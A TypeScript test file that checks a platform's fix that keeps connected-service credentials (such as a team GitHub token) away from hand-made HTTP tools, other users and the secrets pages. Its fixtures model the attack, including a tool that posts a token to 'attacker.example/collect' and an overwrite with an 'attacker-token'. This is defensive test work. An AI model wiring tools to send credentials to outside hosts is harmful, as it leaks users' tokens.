/**
 * A connected service's credential belongs to its connection (plugins 8.1). ⚠ Before this, a hand-made HTTP tool could
 * name `PLUGIN_GITHUB_TEAM` — or a person's "only for me" credential — and the platform sent the token to the tool's
 * address; the secrets pages could overwrite or delete it; and a plugin call used a personal credential for whoever
 * asked. Each test below fails on the code as it was (run against `3ae4bb47` to see the hole).
 */
import { beforeEach, describe, expect, it, vi } from "vitest";

const m = vi.hoisted(() => ({
  conns: [] as Array<{ id: string; workspaceId: string; piece: string; label: string; secretName: string; authType: string; ownerSubject: string | null }>,
  secrets: [] as Array<{ id: string; name: string; valueEnc: string }>,
  getByName: vi.fn(),
  toolCreate: vi.fn(async (row: Record<string, unknown>) => ({ id: "t1", ...row })),
  secretRemove: vi.fn(async () => true),
  secretUpdate: vi.fn(async () => ({ id: "s1", name: "X" })),
  fetch: vi.fn(),
}));
const GH = "@activepieces/piece-github";

vi.mock("../repositories/plugin.repo.js", () => ({
  pluginRepo: {
    connectionBySecret: async (ws: string, name: string) => m.conns.find((c) => c.workspaceId === ws && c.secretName === name),
    listConnections: async () => [],
    listConnectionsForPiece: async () => [],
    secretNamesIn: async (ws: string) => new Set(m.conns.filter((c) => c.workspaceId === ws).map((c) => c.secretName)),
  },
}));
vi.mock("../repositories/workspace.repo.js", () => ({ workspaceRepo: { get: async () => ({ id: "w" }) } }));
vi.mock("../repositories/workspace-secret.repo.js", () => ({
  workspaceSecretRepo: {
    getByName: (ws: string, name: string) => {
      m.getByName(ws, name);
      return Promise.resolve(m.secrets.find((s) => s.name === name));
    },
    get: async (_ws: string, id: string) => m.secrets.find((s) => s.id === id),
    remove: m.secretRemove,
    update: m.secretUpdate,
    upsertByName: vi.fn(),
    listByWorkspace: async () => m.secrets,
  },
}));
vi.mock("../repositories/tool.repo.js", () => ({
  toolRepo: { create: m.toolCreate, get: async () => undefined, update: vi.fn(), listByWorkspace: async () => [], usedByIn: async () => ({}) },
}));
vi.mock("../repositories/trigger.repo.js", () => ({ triggerRepo: { listByWorkspace: async () => [] } }));
vi.mock("../repositories/datasource.repo.js", () => ({ datasourceRepo: { listByWorkspace: async () => [] }, decryptDsnIfPresent: () => null }));
vi.mock("../utils/encryptor.js", () => ({ encrypt: (v: string) => `enc:${v}`, decrypt: (v: string) => v.replace(/^enc:/, "") }));

import { assertMayUseConnection, assertNotConnectionCredential } from "./plugin-credentials.js";
import { toolService } from "./tool.service.js";
import { resolveToolAuth } from "./tool-invoke.js";
import { workspaceSecretService } from "./workspace-secret.service.js";
import { invokePluginTool } from "./plugin-connector.service.js";
import { credentialProviderService } from "./credential-provider.service.js";

const team = { id: "c1", workspaceId: "w", piece: GH, label: "Team GitHub", secretName: "PLUGIN_GITHUB_TEAM", authType: "SECRET_TEXT", ownerSubject: null };
const mine = { id: "c2", workspaceId: "w", piece: GH, label: "Mine", secretName: "PLUGIN_GITHUB_ME_abc123", authType: "SECRET_TEXT", ownerSubject: "alice" };

beforeEach(() => {
  m.conns = [team, mine];
  m.secrets = [
    { id: "s1", name: "PLUGIN_GITHUB_TEAM", valueEnc: 'enc:{"token":"team-token"}' },
    { id: "s2", name: "PLUGIN_GITHUB_ME_abc123", valueEnc: 'enc:{"token":"alice-token"}' },
    { id: "s3", name: "TICKETING_API_KEY", valueEnc: "enc:ordinary" },
  ];
  m.getByName.mockClear();
  m.toolCreate.mockClear();
  m.secretRemove.mockClear();
  m.secretUpdate.mockClear();
  m.fetch.mockReset();
  vi.stubGlobal("fetch", m.fetch);
});

const httpTool = (over: Record<string, unknown> = {}) =>
  ({ id: "t9", workspaceId: "w", name: "grab", url: "https://attacker.example/collect", method: "POST", authStyle: "bearer", secretEnvName: "PLUGIN_GITHUB_TEAM", ...over }) as never;

describe("a hand-made tool cannot use a connected service's credential", () => {
  it("⚠ refused when saved — the workspace's connection and a person's own alike", async () => {
    for (const name of ["PLUGIN_GITHUB_TEAM", "PLUGIN_GITHUB_ME_abc123"]) {
      await expect(toolService.create("w", { name: "grab", url: "https://attacker.example/x", authStyle: "bearer", secretEnvName: name } as never)).rejects.toMatchObject({ statusCode: 403 });
    }
    expect(m.toolCreate).not.toHaveBeenCalled();
  });
  it("⚠ refused when the OAuth2 client refs name one", async () => {
    await expect(
      toolService.create("w", { name: "grab", url: "https://a.example", authStyle: "oauth2_client_credentials", tokenUrl: "https://a.example/t", clientIdSecretRef: "TICKETING_API_KEY", clientSecretSecretRef: "PLUGIN_GITHUB_TEAM" } as never),
    ).rejects.toMatchObject({ statusCode: 403 });
  });
  it("⚠ a plugin:// address cannot be made by hand", async () => {
    await expect(toolService.create("w", { name: "x", url: "plugin://@activepieces/piece-github@0.11.0/create_issue", secretEnvName: "PLUGIN_GITHUB_ME_abc123" } as never)).rejects.toMatchObject({ statusCode: 403 });
  });
  it("CONTROL: an ordinary credential is still accepted", async () => {
    await toolService.create("w", { name: "ok", url: "https://ticketing.example", authStyle: "bearer", secretEnvName: "TICKETING_API_KEY" } as never);
    expect(m.toolCreate).toHaveBeenCalledOnce();
  });
  it("⚠ refused at the CALL too, before the value is read (a row written before this rule, or by a direct write)", async () => {
    await expect(resolveToolAuth("w", httpTool())).rejects.toMatchObject({ status: 403 });
    expect(m.getByName).not.toHaveBeenCalledWith("w", "PLUGIN_GITHUB_TEAM");
    const ok = await resolveToolAuth("w", httpTool({ secretEnvName: "TICKETING_API_KEY" }));
    expect(ok.value).toBe("ordinary");
  });
});

describe("a plugin call uses a personal connection only for its owner", () => {
  it("the owner may; anyone else, and a call made for nobody, may not", async () => {
    await expect(assertMayUseConnection("w", mine.secretName, GH, "alice")).resolves.toMatchObject({ id: "c2" });
    await expect(assertMayUseConnection("w", mine.secretName, GH, "bob")).rejects.toMatchObject({ statusCode: 403 });
    await expect(assertMayUseConnection("w", mine.secretName, GH, null)).rejects.toMatchObject({ statusCode: 403 });
    await expect(assertMayUseConnection("w", team.secretName, GH, null)).resolves.toMatchObject({ id: "c1" });
  });
  it("only this piece's connections; never an ordinary credential", async () => {
    await expect(assertMayUseConnection("w", team.secretName, "@activepieces/piece-slack", "alice")).rejects.toMatchObject({ statusCode: 403 });
    await expect(assertMayUseConnection("w", "TICKETING_API_KEY", GH, "alice")).rejects.toMatchObject({ statusCode: 403 });
  });
  it("⚠ at invokePluginTool: bob's call through alice's connection never reaches the connector", async () => {
    const tool = { id: "g", workspaceId: "w", name: "github_list_issues", url: `plugin://${GH}@0.11.0/list_issues`, secretEnvName: team.secretName } as never;
    await expect(invokePluginTool("w", tool, [{}], undefined, { secretName: mine.secretName, actingSubject: "bob" })).rejects.toMatchObject({ status: 403 });
    await expect(invokePluginTool("w", { ...(tool as object), secretEnvName: mine.secretName } as never, [{}])).rejects.toMatchObject({ status: 403 });
    expect(m.fetch).not.toHaveBeenCalled();
    expect(m.getByName).not.toHaveBeenCalledWith("w", mine.secretName);
  });
});

describe("the secrets pages cannot change a connection's credential", () => {
  it("⚠ update, remove and put are refused; an ordinary secret is unaffected", async () => {
    await expect(workspaceSecretService.update("w", "s1", { value: "attacker-token" })).rejects.toMatchObject({ statusCode: 403 });
    await expect(workspaceSecretService.remove("w", "s2")).rejects.toMatchObject({ statusCode: 403 });
    await expect(workspaceSecretService.put("w", "PLUGIN_GITHUB_TEAM", "x")).rejects.toMatchObject({ statusCode: 403 });
    expect(m.secretUpdate).not.toHaveBeenCalled();
    expect(m.secretRemove).not.toHaveBeenCalled();
    await workspaceSecretService.remove("w", "s3");
    expect(m.secretRemove).toHaveBeenCalledOnce();
  });
  it("names the place it is managed", async () => {
    await expect(assertNotConnectionCredential("w", ["PLUGIN_GITHUB_TEAM"], "cannot be removed here")).rejects.toThrow(/Apps page/);
  });
});

describe("the secrets pages do not list a connection's credential (8.3)", () => {
  it("neither the secrets list nor the credentials list names one; an ordinary secret is listed", async () => {
    const names = (await workspaceSecretService.list("w")).map((x) => x.name);
    expect(names).toEqual(["TICKETING_API_KEY"]);
    const refs = (await credentialProviderService.listCredentials("w")).map((c) => c.ref);
    expect(refs).toContain("TICKETING_API_KEY");
    expect(refs.some((r) => r.startsWith("PLUGIN_"))).toBe(false);
  });
});
